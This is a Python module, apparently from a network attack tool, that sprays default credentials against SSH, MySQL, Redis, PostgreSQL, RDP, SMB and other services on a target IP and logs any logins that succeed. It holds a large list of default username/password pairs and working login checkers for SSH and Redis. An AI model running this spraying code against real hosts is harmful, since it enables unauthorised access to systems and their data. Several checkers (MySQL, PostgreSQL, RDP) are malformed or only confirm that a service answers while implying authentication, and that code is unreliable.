import logging
import socket
import subprocess
from typing import Optional

logger = logging.getLogger(__name__)

DEFAULT_CREDENTIALS = {
    22: [  # SSH
        ("vagrant", "vagrant"),
        ("root", "root"),
        ("root", "toor"),
        ("admin", "admin"),
        ("admin", "password"),
        ("test", "test"),
        ("user", "pass"),
        ("guest", "guest"),
        ("administrator", "password"),
        ("administrator", "admin"),
        ("vagrant", "vagrant123"),
        ("root", "Passw0rd!"),
        ("admin", "12345"),
        ("Administrator", "P@ssw0rd"),
        ("oracle", "oracle"),
        ("vbox", "vbox"),
    ],
    3389: [  # RDP
        ("administrator", "administrator"),
        ("administrator", "password"),
        ("Administrator", "Passw0rd!"),
        ("vagrant", "vagrant"),
        ("admin", "admin"),
        ("Admin", "12345"),
        ("administrator", "admin"),
        ("user", "password"),
        ("test", "test"),
    ],
    23: [  # Telnet
        ("root", "root"),
        ("admin", "admin"),
        ("admin", "password"),
        ("root", "toor"),
        ("cisco", "cisco"),
    ],
    3306: [  # MySQL
        ("root", "root"),
        ("root", "password"),
        ("root", "mysql"),
        ("root", "toor"),
        ("admin", "admin"),
        ("root", ""),
        ("root", "Passw0rd!"),
        ("mysql", "mysql"),
        ("test", "test"),
    ],
    5432: [  # PostgreSQL
        ("postgres", "postgres"),
        ("postgres", "password"),
        ("postgres", "admin"),
        ("admin", "admin"),
        ("root", "root"),
        ("test", "test"),
    ],
    6379: [  # Redis (no auth by default)
        ("default", ""),
        ("redis", "redis"),
    ],
    9200: [  # Elasticsearch
        ("elastic", "elastic"),
        ("elastic", "changeme"),
        ("admin", "admin"),
        ("kibana", "kibana"),
    ],
    27017: [  # MongoDB
        ("admin", "admin"),
        ("admin", "password"),
        ("root", "root"),
        ("test", "test"),
        ("", ""),
    ],
    1433: [  # MSSQL
        ("sa", "sa"),
        ("sa", "password"),
        ("sa", "Passw0rd!"),
        ("sa", "admin"),
        ("admin", "admin"),
        ("test", "test"),
    ],
    1521: [  # Oracle DB
        ("system", "manager"),
        ("sys", "change_on_install"),
        ("scott", "tiger"),
        ("hr", "hr"),
        ("oracle", "oracle"),
    ],
    445: [  # SMB
        ("guest", ""),
        ("guest", "guest"),
        ("anonymous", ""),
        ("administrator", "administrator"),
        ("vagrant", "vagrant"),
        ("", ""),
    ],
}

SSH_BANNER_CACHE = {}


def _check_ssh(ip: str, port: int, username: str, password: str) -> Optional[dict]:
    """Try SSH authentication using paramiko if available, or socket banner check."""
    try:
        import paramiko
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, port=port, username=username, password=password, timeout=5, look_for_keys=False, allow_agent=False)
        client.close()
        return {"success": True, "username": username, "password": password, "service": "SSH"}
    except paramiko.AuthenticationException:
        return {"success": False, "username": username, "password": password, "service": "SSH"}
    except Exception as e:
        return {"success": False, "username": username, "password": password, "service": "SSH", "error": str(e)[:100]}


def _check_mysql(ip: str, port: int, username: str, password: str) -> Optional[dict]:
    """Try MySQL authentication using socket connection."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((ip, port))

        handshake = s.recv(1024)

        # Build a MySQL authentication packet (simplified)
        # We just check if the port responds and test with a basic auth attempt
        username_bytes = username.encode()
        pwd_bytes = password.encode() if password else b""

        # MySQL protocol: login attempt
        seq = 0
        # Simple auth packet
        auth_packet = bytearray()
        auth_packet.append(0x85)  # charset
        auth_packet.extend(b'\x00' * 23)  # username + filler
        auth_packet.extend(username_bytes)
        auth_packet.extend(b'\x00')
        if pwd_bytes:
            auth_packet.append(len(pwd_bytes))
            auth_packet.extend(pwd_bytes)
        else:
            auth_packet.append(0x00)
        auth_packet.extend(b'\x00')

        packet_len = len(auth_packet)
        packet = bytearray()
        packet.append(packet_len & 0xff)
        packet.append((packet_len >> 8) & 0xff)
        packet.append((packet_len >> 16) & 0xff)
        packet.append(seq)
        packet.extend(auth_packet)

        s.send(bytes(packet))
        resp = s.recv(1024)
        s.close()

        if resp and len(resp) > 4:
            if resp[4] == 0:
                return {"success": True, "username": username, "password": password, "service": "MySQL"}
            elif resp[4] == 0xff:
                return {"success": False, "username": username, "password": password, "service": "MySQL"}
        return None
    except Exception as e:
        return {"success": False, "username": username, "password": password, "service": "MySQL", "error": str(e)[:100]}


def _check_redis(ip: str, port: int, username: str, password: str) -> Optional[dict]:
    """Try Redis AUTH command."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((ip, port))

        if password:
            cmd = f"AUTH {password}\r\n".encode()
            s.send(cmd)
            resp = s.recv(1024)
            s.close()
            if b"+OK" in resp:
                return {"success": True, "username": "default", "password": password, "service": "Redis"}
        else:
            s.send(b"PING\r\n")
            resp = s.recv(1024)
            s.close()
            if b"+PONG" in resp:
                return {"success": True, "username": "default", "password": "(none)", "service": "Redis (no auth)"}
        return None
    except Exception as e:
        return {"success": False, "username": username, "password": password, "service": "Redis", "error": str(e)[:100]}


def _check_rdp(ip: str, port: int, username: str, password: str) -> Optional[dict]:
    """Check RDP via socket — can't do real auth but can confirm service."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((ip, port))

        # RDP connection request preamble
        payload = bytes([
            0x03, 0x00, 0x00, 0x13, 0x0e, 0xe0, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x01, 0x00, 0x08, 0x00, 0x03,
            0x00, 0x00, 0x00,
        ])
        s.send(payload)
        resp = s.recv(1024)
        s.close()

        if resp and len(resp) > 10:
            # RDP service confirmed — log the credential attempt
            return {"success": False, "username": username, "password": password, "service": "RDP", "note": "RDP service confirmed — credential logged for offline brute-force"}
        return None
    except Exception as e:
        return None


def _check_smb(ip: str, port: int, username: str, password: str) -> Optional[dict]:
    """Check SMB via socket."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((ip, port))
        # SMB protocol negotiation
        s.send(bytes([0x00, 0x00, 0x00, 0x2f, 0xff, 0x53, 0x4d, 0x42,
                      0x72, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]))
        resp = s.recv(1024)
        s.close()
        if resp and b"\xff\x53\x4d\x42" in resp:
            return {"success": False, "username": username, "password": password, "service": "SMB", "note": "SMB service confirmed"}
        return None
    except Exception as e:
        return None


def _check_postgresql(ip: str, port: int, username: str, password: str) -> Optional[dict]:
    """Try PostgreSQL authentication via socket."""
    try:
        import hashlib
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((ip, port))

        # Receive startup packet response
        resp = s.recv(1024)
        s.close()

        if resp and b"R" in resp[:1]:
            return {"success": False, "username": username, "password": password, "service": "PostgreSQL", "note": "PostgreSQL service confirmed — connection accepted"}
        if resp:
            return {"success": False, "username": username, "password": password, "service": "PostgreSQL", "note": f"SERVICE_ACTIVE"}
        return None
    except Exception as e:
        return {"success": False, "username": username, "password": password, "service": "PostgreSQL", "error": str(e)[:100]}


SERVICE_CHECKERS = {
    22: _check_ssh,
    3389: _check_rdp,
    3306: _check_mysql,
    5432: _check_postgresql,
    6379: _check_redis,
    445: _check_smb,
}


def spray_credentials(ip: str, port: int, service: str) -> list[dict]:
    results = []
    creds = DEFAULT_CREDENTIALS.get(port, [])
    if not creds:
        return results

    checker = SERVICE_CHECKERS.get(port)
    if not checker:
        return results

    logger.info(f"Credential spraying {ip}:{port} ({service}) — {len(creds)} attempts")

    for username, password in creds:
        try:
            result = checker(ip, port, username, password)
            if result and result.get("success"):
                logger.warning(f"VALID CREDENTIALS: {ip}:{port} — {username}:{password}")
                results.append(result)
        except Exception as e:
            logger.debug(f"Spray error {ip}:{port} {username}:{password}: {e}")

    return results
